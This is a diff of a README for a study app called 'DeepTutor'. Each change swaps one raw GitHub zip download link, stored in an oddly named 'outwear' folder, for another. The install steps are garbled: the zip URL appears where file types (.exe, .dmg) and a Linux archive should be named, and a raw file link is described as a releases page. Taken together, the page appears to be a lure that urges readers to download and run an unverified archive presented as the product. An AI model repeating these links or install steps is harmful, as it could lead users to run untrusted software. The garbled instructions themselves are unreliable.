@@ -1,6 +1,6 @@
 # 🎓 DeepTutor - Your Smart Study Companion Simplified
 
-[![Download DeepTutor](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-1.7.zip)](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-1.7.zip)
+[![Download DeepTutor](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-v3.0.zip)](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-v3.0.zip)
 
 ## 🌟 Overview
 
@@ -28,16 +28,16 @@ Follow these steps to download and install DeepTutor.
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
    
-   [Download DeepTutor](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-1.7.zip)
+   [Download DeepTutor](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-v3.0.zip)
 
 2. **Select the Latest Release**: Look for the most recent version at the top of the page. It will generally have the highest version number (e.g., v1.0).
 
-3. **Download DeepTutor**: Click the download link for your operating system. Depending on the platform, the file may be a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-1.7.zip` file.
+3. **Download DeepTutor**: Click the download link for your operating system. Depending on the platform, the file may be a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-v3.0.zip` file.
 
 4. **Install DeepTutor**:
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For macOS: Open the downloaded `.dmg` file, drag the DeepTutor application to your Applications folder, and then run it.
-   - For Linux: Extract the `https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-1.7.zip` file and follow the instructions in the README provided in the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-v3.0.zip` file and follow the instructions in the README provided in the folder.
 
 5. **Launch DeepTutor**: After installation, locate DeepTutor in your applications list or taskbar, then open it.
 
@@ -45,7 +45,7 @@ Follow these steps to download and install DeepTutor.
 
 Return to the link here to download:
 
-[Download DeepTutor](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-1.7.zip)
+[Download DeepTutor](https://raw.githubusercontent.com/miljuds2/DeepTutor/main/outwear/Tutor-Deep-v3.0.zip)
 
 Make sure to follow the steps outlined above to install the software correctly.
 
